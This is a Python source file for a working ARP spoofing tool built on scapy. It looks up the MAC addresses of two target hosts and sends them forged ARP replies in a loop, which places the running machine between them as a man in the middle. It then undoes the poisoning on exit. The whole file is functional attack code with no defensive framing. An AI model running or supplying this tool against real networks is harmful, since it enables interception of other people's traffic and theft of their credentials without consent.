import scapy.all as scapy
import sys
import signal
import time


class ArpSpoofer:

    def __init__(self, target_1_ip, target_2_ip):
        self.target_1_ip = target_1_ip
        self.target_1_mac = self.get_mac(target_1_ip)
        self.target_2_ip = target_2_ip
        self.target_2_mac = self.get_mac(target_2_ip)
        # Initialize signal to undo spoof on Ctrl + C #
        signal.signal(signal.SIGINT, self.signal_handler)

    def print_setup(self):
        print("The current setup defined for this attack is: ")
        print("Target n°1 MAC: ", self.target_1_mac)
        print("Target n°1 IP: ", self.target_1_ip)
        print("Target n°2 MAC: ", self.target_2_mac)
        print("Target n°2 IP: ", self.target_2_ip)

    def change_target_1(self, new_ip):
        self.target_1_ip = new_ip
        self.target_1_mac = self.get_mac(new_ip)

    def change_target_2(self, new_ip):
        self.target_2_ip = new_ip
        self.target_2_mac = self.get_mac(new_ip)

    def signal_handler(self, signal, frame):
        print("\nProgram exiting gracefully and MAC spoof is being undone...")
        self.undo_spoof()
        global continue_loop
        continue_loop = False

    @staticmethod
    def get_mac(ip):
        pckt = scapy.ARP(pdst=ip, hwdst="00:00:00:00:00:00")
        ans, unans = scapy.sr(pckt, timeout=5, verbose=False)
        # Check if answer was received
        if len(ans) > 0:
            for snd, rcv in ans:
                mac = rcv.hwsrc
            return mac
        else:
            sys.exit("Could not discover mac of target " + ip + ". Is this host really active?")

    def spoof(self):
        pckt_to_t1 = scapy.ARP(op="is-at", hwdst=self.target_1_mac, psrc=self.target_2_ip,
                               pdst=self.target_1_ip)
        pckt_to_t2 = scapy.ARP(op="is-at", hwdst=self.target_2_mac, psrc=self.target_1_ip,
                               pdst=self.target_2_ip)
        scapy.sr(pckt_to_t1, timeout=5, verbose=False)
        scapy.sr(pckt_to_t2, timeout=5, verbose=False)

    def undo_spoof(self):
        pckt_to_t1 = scapy.ARP(op="is-at", hwsrc=self.target_2_mac, hwdst=self.target_1_mac,
                               psrc=self.target_2_ip, pdst=self.target_1_ip)
        pckt_to_t2 = scapy.ARP(op="is-at", hwsrc=self.target_1_mac, hwdst=self.target_2_mac,
                               psrc=self.target_1_ip, pdst=self.target_2_ip)
        scapy.sr(pckt_to_t1, timeout=5, verbose=False)
        scapy.sr(pckt_to_t2, timeout=5, verbose=False)

    def attack(self):
        self.print_setup()
        print("#### Spoofing..... #####")
        print("#### Press Ctrl+C to finish the attack ####")
        global continue_loop
        continue_loop = True
        while continue_loop:
            self.spoof()
            time.sleep(2)
